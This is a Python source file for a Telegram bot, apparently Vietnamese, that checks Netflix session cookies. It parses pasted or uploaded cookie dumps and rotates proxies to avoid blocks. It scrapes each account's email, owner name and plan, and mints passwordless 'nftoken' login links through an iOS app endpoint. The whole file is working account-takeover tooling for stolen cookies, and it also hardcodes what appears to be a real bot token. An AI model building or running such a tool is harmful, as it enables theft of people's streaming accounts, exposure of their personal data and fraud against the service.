import os
import re
import html
import json
import queue
import random
import string
import sys
import threading
import unicodedata
import http.server
import socketserver
from datetime import datetime, timedelta, timezone
import requests
import telebot
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# 🔴 THAY THẾ TOKEN BOT CỦA BẠN VÀO ĐÂY (Lấy từ @BotFather)
TELEGRAM_BOT_TOKEN = "8918692221:AAEP3sI9K_5WBgpFPjtQORsnbmyNMEd06iY"

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# =========================================================================
# PHẦN 1: LOGIC XỬ LÝ COOKIE & TRÍCH XUẤT DỮ LIỆU NETFLIX
# =========================================================================

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}

def _build_proxy_dict(scheme, host, port, user=None, password=None):
    host = host.strip()
    if host.startswith("[") and host.endswith("]"): host = host[1:-1]
    proxy_url = f"{scheme}://{user}:{password}@{host}:{port}" if user and password else f"{scheme}://{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}

def _parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"): return None
    if not re.match(r'^[a-zA-Z][a-zA-Z0-9+.-]*://', line):
        line = "http://" + line
    url_like = re.match(r"^(?P<scheme>https?|socks5h?|socks4a?)://(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line, flags=re.IGNORECASE)
    if url_like:
        d = url_like.groupdict()
        return _build_proxy_dict(d["scheme"].lower(), d["host"], d["port"], d.get("user"), d.get("password"))
    return None

def load_proxies():
    proxies = []
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                p = _parse_proxy_line(line)
                if p: proxies.append(p)
    return proxies

def canonicalize_netflix_cookie_name(name):
    normalized = str(name or "").strip()
    return CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), normalized)

def is_netflix_domain(domain):
    normalized = str(domain or "").strip().lower()
    if normalized.startswith("#httponly_"): normalized = normalized[len("#httponly_"):]
    return "netflix." in normalized

def is_netflix_cookie_entry(domain, name):
    return canonicalize_netflix_cookie_name(name) in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)

def split_netscape_cookie_columns(line):
    stripped = line.strip()
    if not stripped or (stripped.startswith("#") and not stripped.startswith("#HttpOnly_")): return []
    if stripped.startswith("#HttpOnly_"): stripped = stripped[len("#HttpOnly_"):]
    parts = stripped.split("\t")
    if len(parts) >= 7: return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", stripped, maxsplit=6)
    return parts if len(parts) >= 7 else []

def is_netscape_cookie_line(line):
    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7: return False
    if parts[1].upper() not in ("TRUE", "FALSE") or parts[3].upper() not in ("TRUE", "FALSE"): return False
    return bool(re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()))

def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name, value, position):
    normalized_expires = str(expires or 0).strip()
    if re.fullmatch(r"-?\d+\.\d+", normalized_expires):
        try: normalized_expires = str(int(float(normalized_expires)))
        except: pass
    return {
        "domain": str(domain or "").replace("#HttpOnly_", "", 1),
        "tail_match": "TRUE" if str(tail_match).upper() == "TRUE" else "FALSE",
        "path": str(path or "/"),
        "secure": "TRUE" if str(secure).upper() == "TRUE" else "FALSE",
        "expires": normalized_expires or "0",
        "name": canonicalize_netflix_cookie_name(name),
        "value": str(value or ""),
        "position": position,
    }

def format_netscape_cookie_entry(entry):
    return f"{entry['domain']}\t{entry['tail_match']}\t{entry['path']}\t{entry['secure']}\t{entry['expires']}\t{entry['name']}\t{entry['value']}"

def extract_netscape_cookie_entries(raw_text):
    entries = []
    for index, line in enumerate(raw_text.splitlines()):
        if not is_netscape_cookie_line(line): continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7: continue
        if is_netflix_cookie_entry(parts[0], parts[5]):
            entries.append(build_netscape_cookie_entry(parts[0], parts[1], parts[2], parts[3], parts[4], parts[5], parts[6], index))
    return entries

def extract_json_cookie_entries(content):
    try: json_data = json.loads(content)
    except: return []
    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list): json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list): json_data = json_data["items"]
        else: json_data = [json_data]
    if not isinstance(json_data, list): return []
    entries = []
    for index, cookie in enumerate(json_data):
        if not isinstance(cookie, dict): continue
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if is_netflix_cookie_entry(domain, name):
            entries.append(build_netscape_cookie_entry(domain, "TRUE" if str(domain).startswith(".") else "FALSE", cookie.get("path", "/"), "TRUE" if cookie.get("secure", False) else "FALSE", cookie.get("expirationDate", cookie.get("expiration", 0)), name, cookie.get("value", ""), index))
    return entries

def extract_raw_cookie_entries(raw_text):
    pattern = re.compile(rf"(?:['\"])?(?P<name>{'|'.join(sorted((re.escape(name) for name in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))})(?:['\"])?\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)", re.IGNORECASE)
    entries = []
    for index, match in enumerate(pattern.finditer(raw_text)):
        cookie_name = canonicalize_netflix_cookie_name(match.group("name"))
        value = match.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}: value = value[1:-1]
        else: value = value.rstrip(",")
        entries.append(build_netscape_cookie_entry(".netflix.com", "TRUE", "/", "TRUE" if cookie_name == "SecureNetflixId" else "FALSE", "0", cookie_name, value, index))
    return entries

def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = split_netscape_cookie_columns(line)
        if len(parts) >= 7 and is_netflix_cookie_entry(parts[0], parts[5]):
            cookies[canonicalize_netflix_cookie_name(parts[5])] = parts[6]
    return cookies

def build_cookie_bundles_from_entries(entries):
    if not entries: return []
    entries_by_name = {}
    for entry in entries:
        if entry.get("name"): entries_by_name.setdefault(entry["name"], []).append(entry)
    if not entries_by_name: return []
    bundle_count = len(entries_by_name.get("NetflixId", [])) or max(len(e) for e in entries_by_name.values())
    bundles = []
    for i in range(bundle_count):
        sel = []
        for ne in entries_by_name.values():
            if i < len(ne): sel.append(ne[i])
            elif len(ne) == 1: sel.append(ne[0])
        if not sel: continue
        sel = sorted(sel, key=lambda item: item.get("position", 0))
        txt = "\n".join(format_netscape_cookie_entry(e) for e in sel)
        bundles.append({"index": i + 1, "total": bundle_count, "netscape_text": txt, "cookies": cookies_dict_from_netscape(txt)})
    return bundles

def extract_netflix_cookie_bundles(content):
    for ext in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
        b = build_cookie_bundles_from_entries(ext(content))
        if b: return b
    return []

def decode_netflix_value(value):
    if value is None: return None
    cleaned = html.unescape(str(value))
    for s, t in {"\\x20": " ", "\\u00A0": " ", "\\u00a0": " ", "&nbsp;": " ", "u00A0": " ", "\\/": "/", '\\"': '"', "\\n": " ", "\\t": " "}.items():
        cleaned = cleaned.replace(s, t)
    for _ in range(3):
        prev = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
        if cleaned == prev: break
    return re.sub(r"\s+", " ", cleaned).strip() or None

def extract_first_match(text, patterns, flags=0):
    for p in patterns:
        m = re.search(p, text, flags)
        if m: return decode_netflix_value(m.group(1))
    return None

def extract_profile_names(text):
    names = []
    for p in [r'"profileName"\s*:\s*"([^"]+)"', r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"']:
        for f in re.findall(p, text, re.DOTALL):
            d = decode_netflix_value(f)
            if d and d not in names: names.append(d)
    return ", ".join(names) if names else None

def extract_info(text):
    membership_status = extract_first_match(text, [r'"membershipStatus"\s*:\s*"([^"]+)"', r'"membershipStatus":\s*"([^"]+)"'])
    localized_plan_name = extract_first_match(text, [r'"planName"\s*:\s*"([^"]+)"', r'"localizedPlanName"\s*:\s*"([^"]+)"', r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"'])
    if not localized_plan_name:
        if "premium" in text.lower(): localized_plan_name = "Premium Plan"
        elif "standard" in text.lower(): localized_plan_name = "Standard Plan"
        elif "basic" in text.lower(): localized_plan_name = "Basic Plan"
    return {
        "email": extract_first_match(text, [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"', r'"loginId"\s*:\s*"([^"]+)"']),
        "countryOfSignup": extract_first_match(text, [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"', r'"country"\s*:\s*"([^"]+)"']),
        "membershipStatus": membership_status,
        "localizedPlanName": localized_plan_name,
        "accountOwnerName": extract_first_match(text, [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"firstName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']),
        "profilesDisplay": extract_profile_names(text)
    }

def is_subscribed_account(info, html_text=""):
    status = str(info.get("membershipStatus") or "").lower()
    plan = str(info.get("localizedPlanName") or "").lower()
    if "current_member" in status or "active" in status: return True
    if plan and not any(x in plan for x in ("free", "none", "null")): return True
    if "membership" in html_text.lower() and "sign out" in html_text.lower() and not "restart membership" in html_text.lower(): return True
    return False

def is_on_hold_account(info, html_text=""):
    status = str(info.get("membershipStatus") or "").lower()
    if any(t in status for t in ("hold", "past_due", "payment_retry", "paused", "suspend")): return True
    if "account on hold" in html_text.lower() or "update payment" in html_text.lower(): return True
    return False

def country_code_to_flag(code):
    raw = str(code or "").strip().upper()
    return "".join(chr(127397 + ord(c)) for c in raw) if len(raw) == 2 and raw.isalpha() else "🌍"

# 🔍 PHẦN NÂNG CẤP: BẮT MÃ LỖI CHI TIẾT TỪ ĐẦU RA API NETFLIX
def create_nftoken(cookie_dict, proxy=None):
    netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
    secure_id = decode_netflix_value(cookie_dict.get("SecureNetflixId"))
    
    if not netflix_id: 
        return "Lỗi: Thiếu trường Cookie 'NetflixId'"
    if not secure_id:
        return "Lỗi: Thiếu trường Cookie 'SecureNetflixId' (Bắt buộc cho App di động)"

    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    params = {"appVersion": "15.48.1", "device_type": "NFAPPL-02-", "idiom": "phone", "path": '["account","token","default"]', "responseFormat": "json"}
    headers = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)", 
        "Cookie": f"NetflixId={netflix_id}; SecureNetflixId={secure_id}", 
        "x-netflix.argo.translated": "true"
    }
    try:
        r = requests.get(url, params=params, headers=headers, proxies=proxy, timeout=12, verify=False)
        if r.status_code == 200:
            tk = r.json().get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
            if tk: return f"https://netflix.com/?nftoken={tk}"
            return "Lỗi: Netflix nhận cookie nhưng từ chối trả Token cây JSON"
        elif r.status_code == 403:
            return "Lỗi 403 Forbidden: Netflix đã phát hiện và khóa IP của Server Render"
        elif r.status_code == 429:
            return "Lỗi 429: IP gửi yêu cầu quá nhanh, bị Netflix chặn tạm thời"
        return f"Lỗi HTTP {r.status_code}: Không thể lấy mã phản hồi từ App"
    except requests.exceptions.Timeout:
        return "Lỗi Timeout: Đường truyền Proxy quá chậm, không phản hồi kịp"
    except Exception as e:
        return f"Lỗi Kết Nối: {str(e)}"

# =========================================================================
# PHẦN 2: WEB SERVER GIẢ LẬP ĐỂ GIỮ RENDER KHÔNG BỊ DOWN
# =========================================================================

def run_dummy_web_server():
    port = int(os.environ.get("PORT", 10000))
    class DummyHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write("Bot Checker Netflix Online 24/7!".encode("utf-8"))
    with socketserver.TCPServer(("", port), DummyHandler) as httpd:
        httpd.serve_forever()

# =========================================================================
# PHẦN 3: GIAO DIỆN VÀ XỬ LÝ BOT TELEGRAM
# =========================================================================

def get_inline_restart_keyboard():
    markup = telebot.types.InlineKeyboardMarkup()
    btn_restart = telebot.types.InlineKeyboardButton("🔄 Kiểm tra tài khoản tiếp theo", callback_data="restart_bot")
    markup.add(btn_restart)
    return markup

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = (
        "👋 **Chào mừng bạn đến với Netflix Cookie Checker Bot!**\n\n"
        "⚡ **Cách sử dụng rất đơn giản:**\n"
        "1️⃣ **Cách 1:** Copy nội dung cookie và dán (Paste) thẳng văn bản vào đây.\n"
        "2️⃣ **Cách 2:** Gửi file định dạng `.txt` hoặc `.json` chứa cookie lên.\n\n"
        "Bot hoạt động 24/7, tự động xuất trạng thái và **Link đăng nhập nhanh NFToken** cho tài khoản sống!"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(content_types=['text'])
def handle_cookie_text(message):
    if message.text.startswith('/'): return
    sent_msg = bot.reply_to(message, "⏳ Đang phân tích dữ liệu cookie, vui lòng đợi...")
    threading.Thread(target=process_cookie_data, args=(message.text, "Nhập trực tiếp", message, sent_msg)).start()

@bot.message_handler(content_types=['document'])
def handle_cookie_file(message):
    file_name = message.document.file_name
    if not file_name.lower().endswith(('.txt', '.json')):
        bot.reply_to(message, "❌ Vui lòng gửi file `.txt` hoặc `.json`!")
        return
    sent_msg = bot.reply_to(message, "⏳ Đang xử lý file cookie của bạn...")
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode("utf-8", errors="ignore")
        threading.Thread(target=process_cookie_data, args=(content, file_name, message, sent_msg)).start()
    except Exception as e:
        bot.edit_message_text(f"⚠️ Lỗi đọc file: {str(e)}", sent_msg.chat.id, sent_msg.message_id)

def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
    try:
        bundles = extract_netflix_cookie_bundles(raw_content)
        if not bundles:
            bot.edit_message_text("❌ Không định dạng được cookie Netflix hợp lệ!", progress_msg.chat.id, progress_msg.message_id, reply_markup=get_inline_restart_keyboard())
            return
            
        bot.edit_message_text(f"🔍 Tìm thấy {len(bundles)} tài khoản tiềm năng. Đang check qua hệ thống mạng Proxy...", progress_msg.chat.id, progress_msg.message_id)
        
        proxies = load_proxies()
        success_count = 0
        final_report = ""
        
        for idx, bundle in enumerate(bundles):
            netscape_text = bundle.get("netscape_text", "")
            cookies = bundle.get("cookies") or cookies_dict_from_netscape(netscape_text)
            
            session = requests.Session()
            session.cookies.update(cookies)
            
            proxy = random.choice(proxies) if proxies else None
            
            try:
                r = session.get("https://www.netflix.com/account/membership", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, proxies=proxy, timeout=12)
                
                if r.status_code == 200 and r.text:
                    info = extract_info(r.text)
                    is_subscribed = is_subscribed_account(info, r.text)
                    account_on_hold = is_subscribed and is_on_hold_account(info, r.text)
                    
                    country = info.get("countryOfSignup") or "US"
                    flag = country_code_to_flag(country)
                    plan_name = info.get("localizedPlanName") or "Gói hoạt động"
                    
                    if account_on_hold: status_str = "⚠️ **ON HOLD** (Lỗi cổng thanh toán)"
                    elif is_subscribed: status_str = "🔥 **LIVE** (Tài khoản hoạt động mượt cước)"
                    else: status_str = "❄️ **FREE** (Hết hạn gói / Không cước)"
                    
                    nftoken_result = create_nftoken(cookies, proxy=proxy)
                    if nftoken_result and nftoken_result.startswith("https://"):
                        nftoken_link_str = f"\n🌐 **Link đăng nhập nhanh:** {nftoken_result}"
                    else:
                        nftoken_link_str = f"\n🌐 **Link đăng nhập nhanh:** _({nftoken_result})_"
                        
                    final_report += (
                        f"📝 **Tài khoản #{idx+1}**\n"
                        f"▪️ Trạng thái: {status_str}\n"
                        f"▪️ Quốc gia: `{country}` {flag}\n"
                        f"▪️ Gói cước: {plan_name}\n"
                        f"▪️ Email: `{info.get('email', 'N/A')}`\n"
                        f"▪️ Chủ tài khoản: {info.get('accountOwnerName', 'N/A')}\n"
                        f"{nftoken_link_str}\n\n"
                    )
                    success_count += 1
                    continue
            except Exception as check_err:
                pass
            final_report += f"❌ **Tài khoản #{idx+1}:** Cookie Die hoặc lỗi mạng Proxy.\n\n"

        header = f"📊 **KẾT QUẢ CHECK COOKIE**\n📦 Nguồn: {source_name}\n✅ LIVE/FREE: {success_count}/{len(bundles)}\n----------------------------------------\n"
        bot.delete_message(progress_msg.chat.id, progress_msg.message_id)
        bot.send_message(original_msg.chat.id, header + final_report, parse_mode="Markdown", disable_web_page_preview=True, reply_markup=get_inline_restart_keyboard())
        
    except Exception as e:
        bot.edit_message_text(f"⚠️ Có lỗi hệ thống: {str(e)}", progress_msg.chat.id, progress_msg.message_id, reply_markup=get_inline_restart_keyboard())

@bot.callback_query_handler(func=lambda call: call.data == "restart_bot")
def callback_restart(call):
    bot.answer_callback_query(call.id)
    send_welcome(call.message)

bot.set_my_commands([telebot.types.BotCommand("start", "🔄 Khởi động lại Bot / Hướng dẫn")])

threading.Thread(target=run_dummy_web_server, daemon=True).start()
bot.infinity_polling()
